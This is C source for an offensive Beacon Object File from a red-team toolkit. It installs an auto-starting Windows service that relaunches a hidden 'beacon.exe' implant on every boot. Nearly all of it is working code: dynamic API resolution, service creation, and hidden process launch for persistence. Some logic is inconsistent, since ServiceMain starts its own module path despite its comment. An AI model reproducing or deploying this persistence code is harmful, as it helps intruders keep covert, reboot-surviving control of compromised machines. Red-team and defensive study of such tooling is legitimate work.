/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "beacon.h"

// ================================
// DIRECT IMPORTS
// ================================
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;

// ================================
// HELPER FUNCTIONS
// ================================
static void* my_memcpy(void* dst, const void* src, size_t len) {
    char* d = (char*)dst;
    const char* s = (const char*)src;
    while (len--) *d++ = *s++;
    return dst;
}

static int my_strlen(const char* str) {
    int len = 0;
    if (!str) return 0;
    while (*str++) len++;
    return len;
}

static char* my_strcat(char* dest, const char* src) {
    char* original = dest;
    if (!dest || !src) return dest;
    while (*dest) dest++;
    while ((*dest++ = *src++));
    return original;
}

static int my_strcmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}
// ================================
// MACRO TO RESOLVE APIS
// ================================
#define RESOLVE_API(lib, name, type) \
    type p##name = (type)((FARPROC(WINAPI*)(HMODULE,LPCSTR))__imp_GetProcAddress)(h##lib, #name); \
    if (!p##name) { \
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] Could not resolve " #name "\n"); \
        goto cleanup; \
    }

// ================================
// GLOBAL VARIABLES FOR THE SERVICE
// ================================
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = NULL;
HANDLE g_StopEvent = NULL;

// ================================
// SERVICE CONTROL HANDLER
// ================================
DWORD WINAPI ServiceHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
    switch (dwControl) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            if (g_StopEvent) SetEvent(g_StopEvent);
            break;
        case SERVICE_CONTROL_PAUSE:
            g_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
    }
    if (g_ServiceStatusHandle) {
        HMODULE hAdvapi32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("advapi32.dll");
        if (hAdvapi32) {
            typedef BOOL (WINAPI *pSetServiceStatus_t)(SERVICE_STATUS_HANDLE, LPSERVICE_STATUS);
            pSetServiceStatus_t pSetServiceStatus = (pSetServiceStatus_t)((FARPROC(WINAPI*)(HMODULE,LPCSTR))__imp_GetProcAddress)(hAdvapi32, "SetServiceStatus");
            if (pSetServiceStatus) {
                pSetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
            }
        }
    }
    return NO_ERROR;
}

// ================================
// SERVICE MAIN FUNCTION
// ================================
VOID WINAPI ServiceMain(DWORD dwArgc, LPSTR *lpszArgv) {
    HMODULE hAdvapi32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("advapi32.dll");
    if (!hAdvapi32) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] Could not load advapi32.dll in ServiceMain\n");
        return;
    }

    // ================================
    // RESOLVE APIS with macro
    // ================================
    typedef SERVICE_STATUS_HANDLE (WINAPI *pRegisterServiceCtrlHandlerA_t)(LPCSTR, LPHANDLER_FUNCTION);
    typedef BOOL (WINAPI *pSetServiceStatus_t)(SERVICE_STATUS_HANDLE, LPSERVICE_STATUS);
    typedef HANDLE (WINAPI *pCreateEventA_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);

    // Temporarily define "cleanup" as an alias of "cleanup_service"
    #define cleanup cleanup_service

    RESOLVE_API(Advapi32, RegisterServiceCtrlHandlerA, pRegisterServiceCtrlHandlerA_t);
    RESOLVE_API(Advapi32, SetServiceStatus, pSetServiceStatus_t);
    RESOLVE_API(Advapi32, CreateEventA, pCreateEventA_t);

    #undef cleanup  // Clear the alias after use

    g_ServiceStatusHandle = pRegisterServiceCtrlHandlerA("LazyOwnSvc", (LPHANDLER_FUNCTION)ServiceHandler);
    if (!g_ServiceStatusHandle) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] RegisterServiceCtrlHandlerA failed\n");
        return;
    }

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;

    pSetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);

    // Create stop event
    g_StopEvent = pCreateEventA(NULL, TRUE, FALSE, NULL);

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    pSetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);

    // ================================
    // PERSISTENCE LOGIC:
    // ================================
    HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    if (!hKernel32) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] Could not load kernel32.dll to launch beacon.exe\n");
        goto cleanup_service;
    }

    // =====================================
    // Types and API resolution (FIXED)
    // =====================================
    typedef BOOL (WINAPI *pCreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    typedef void (WINAPI *pRtlZeroMemory_t)(PVOID, SIZE_T);
    typedef DWORD (WINAPI *pGetLastError_t)(void);
    typedef HMODULE (WINAPI *pGetModuleHandleA_t)(LPCSTR);
    typedef DWORD (WINAPI *pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
    typedef DWORD (WINAPI *pGetFileAttributesA_t)(LPCSTR);
    typedef BOOL (WINAPI *pCloseHandle_t)(HANDLE);
    typedef DWORD (WINAPI *pWaitForSingleObject_t)(HANDLE, DWORD);

    // Temporarily map "cleanup" to "cleanup_service" so the macro works
    #define cleanup cleanup_service

    RESOLVE_API(Kernel32, CreateProcessA, pCreateProcessA_t);
    RESOLVE_API(Kernel32, RtlZeroMemory, pRtlZeroMemory_t);
    RESOLVE_API(Kernel32, GetLastError, pGetLastError_t);
    RESOLVE_API(Kernel32, GetModuleHandleA, pGetModuleHandleA_t);
    RESOLVE_API(Kernel32, GetModuleFileNameA, pGetModuleFileNameA_t);
    RESOLVE_API(Kernel32, GetFileAttributesA, pGetFileAttributesA_t);
    RESOLVE_API(Kernel32, CloseHandle, pCloseHandle_t);
    RESOLVE_API(Kernel32, WaitForSingleObject, pWaitForSingleObject_t);

    #undef cleanup

    char currentPath[MAX_PATH] = {0};
    HMODULE hSelf = pGetModuleHandleA(NULL);
    if (pGetModuleFileNameA(hSelf, currentPath, MAX_PATH) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] GetModuleFileNameA failed\n");
        goto cleanup_service;
    }


    // Launch beacon.exe
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    pRtlZeroMemory(&si, sizeof(si));
    pRtlZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL bSuccess = pCreateProcessA(
        currentPath,      // ApplicationName
        NULL,             // CommandLine
        NULL,             // ProcessAttributes
        NULL,             // ThreadAttributes
        FALSE,            // InheritHandles
        CREATE_NO_WINDOW, // CreationFlags
        NULL,             // Environment
        NULL,             // CurrentDirectory
        &si,              // StartupInfo
        &pi               // ProcessInformation
    );

    if (bSuccess) {
        BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN-SVC][+] beacon.exe launched as child process (PID: %lu)\n", pi.dwProcessId);
        pCloseHandle(pi.hProcess);
        pCloseHandle(pi.hThread);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] CreateProcessA failed. Error: %lu\n", pGetLastError());
    }

    // Wait for stop signal
    if (g_StopEvent) {
        pWaitForSingleObject(g_StopEvent, INFINITE);
    }

cleanup_service:
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    pSetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
    if (g_StopEvent) {
        pCloseHandle(g_StopEvent);
        g_StopEvent = NULL;
    }
}

// ================================
// BOF MAIN FUNCTION
// ================================
void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN-SVC] Starting service installation...\n");

    HMODULE hAdvapi32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("advapi32.dll");
    if (!hAdvapi32) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] Could not load advapi32.dll\n");
        return;
    }

    HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    if (!hKernel32) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] Could not load kernel32.dll\n");
        return;
    }

    // ================================
    // RESOLVE APIS with macro
    // ================================
    typedef HANDLE (WINAPI *pOpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef HANDLE (WINAPI *pCreateServiceA_t)(HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
    typedef BOOL (WINAPI *pStartServiceA_t)(HANDLE, DWORD, LPCSTR*);
    typedef BOOL (WINAPI *pCloseServiceHandle_t)(HANDLE);
    typedef BOOL (WINAPI *pStartServiceCtrlDispatcherA_t)(SERVICE_TABLE_ENTRYA*);
    typedef void (WINAPI *pSleep_t)(DWORD);
    typedef HMODULE (WINAPI *pGetModuleHandleA_t)(LPCSTR);
    typedef DWORD (WINAPI *pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
    typedef void (WINAPI *pRtlZeroMemory_t)(PVOID, SIZE_T);
    typedef DWORD (WINAPI *pGetFileAttributesA_t)(LPCSTR);

    RESOLVE_API(Advapi32, OpenSCManagerA, pOpenSCManagerA_t);
    RESOLVE_API(Advapi32, CreateServiceA, pCreateServiceA_t);
    RESOLVE_API(Advapi32, StartServiceA, pStartServiceA_t);
    RESOLVE_API(Advapi32, CloseServiceHandle, pCloseServiceHandle_t);
    RESOLVE_API(Advapi32, StartServiceCtrlDispatcherA, pStartServiceCtrlDispatcherA_t);
    RESOLVE_API(Kernel32, Sleep, pSleep_t);
    RESOLVE_API(Kernel32, GetModuleHandleA, pGetModuleHandleA_t);
    RESOLVE_API(Kernel32, GetModuleFileNameA, pGetModuleFileNameA_t);
    RESOLVE_API(Kernel32, RtlZeroMemory, pRtlZeroMemory_t);
    RESOLVE_API(Kernel32, GetFileAttributesA, pGetFileAttributesA_t);

    // Open SC Manager
    HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] OpenSCManagerA failed\n");
        goto cleanup;
    }

    char currentPath[MAX_PATH] = {0};
    HMODULE hSelf = pGetModuleHandleA(NULL);
    if (pGetModuleFileNameA(hSelf, currentPath, MAX_PATH) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] GetModuleFileNameA failed\n");
        goto cleanup;
    }

    // Check if path ALREADY ends in "beacon.exe"
    const char* target = "beacon.exe";
    int pathLen = my_strlen(currentPath);
    int targetLen = my_strlen(target);

    if (pathLen < targetLen || my_strcmp(currentPath + pathLen - targetLen, target) != 0) {
        // Does not end in "beacon.exe" -> append it
        char* lastSlash = currentPath + pathLen;
        while (lastSlash > currentPath && *lastSlash != '\\') lastSlash--;

        if (*lastSlash == '\\') {
            my_strcat(lastSlash + 1, target);
        } else {
            my_strcat(currentPath, "\\");
            my_strcat(currentPath, target);
        }
    }

    // Check existence
    if (pGetFileAttributesA(currentPath) == INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] beacon.exe does not exist at: %s\n", currentPath);
        goto cleanup;
    }

    // Create service
    HANDLE hService = pCreateServiceA(
        hSCManager,
        "LazyOwnSvc",
        "LazyOwn Beacon Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        currentPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] CreateServiceA failed\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN-SVC][+] Service 'LazyOwnSvc' created successfully\n");

    // Start service
    if (!pStartServiceA(hService, 0, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][-] StartServiceA failed (it will start on next boot)\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN-SVC][+] Service started successfully\n");
    }

    // Close handles
    pCloseServiceHandle(hService);
    pCloseServiceHandle(hSCManager);

    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN-SVC][+] Installation completed. beacon.exe will run on every boot.\n");
    return;

cleanup:
    BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN-SVC][x] Error during installation\n");
    if (hSCManager) pCloseServiceHandle(hSCManager);
}
